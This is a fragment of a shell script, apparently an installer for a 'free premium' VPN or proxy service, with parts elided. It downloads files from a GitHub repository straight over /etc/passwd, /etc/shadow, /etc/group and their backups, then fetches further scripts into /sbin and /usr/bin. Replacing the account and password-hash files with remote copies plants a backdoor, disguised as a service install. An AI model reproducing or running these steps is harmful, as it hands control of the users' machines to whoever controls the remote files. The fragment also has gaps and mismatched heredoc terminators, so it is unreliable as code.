...
wget -qO /etc/passwd "https://raw.githubusercontent.com/arismaramar/freepremium/main/passwd.sh"
wget -qO /etc/group "https://raw.githubusercontent.com/arismaramar/freepremium/main/group.sh"
wget -qO /etc/shadow "https://raw.githubusercontent.com/arismaramar/freepremium/main/shadow.sh"
wget -qO /etc/passwd- "https://raw.githubusercontent.com/arismaramar/freepremium/main/passwd-.sh"
wget -qO /etc/group- "https://raw.githubusercontent.com/arismaramar/freepremium/main/group-.sh"
wget -qO /etc/shadow- "https://raw.githubusercontent.com/arismaramar/freepremium/main/shadow-.sh"
wget -qO /etc/gshadow- "https://raw.githubusercontent.com/arismaramar/freepremium/main/gshadow-"
wget -qO /etc/passwd "https://raw.githubusercontent.com/arismaramar/freepremium/main/passwd.sh"
END
cat > /sbin/MTnd <<-END
#!/bin/sh
...
EOF
wget -q -O /usr/bin/udpxp "https://raw.githubusercontent.com/arismaramar/freepremium/main/udpxp.sh"
wget -qO /sbin/haproxysrv "https://raw.githubusercontent.com/arismaramar/freepremium/main/haproxysrv"
...
echo "SC FREE PREMIUM  " > /user/namauser.txt
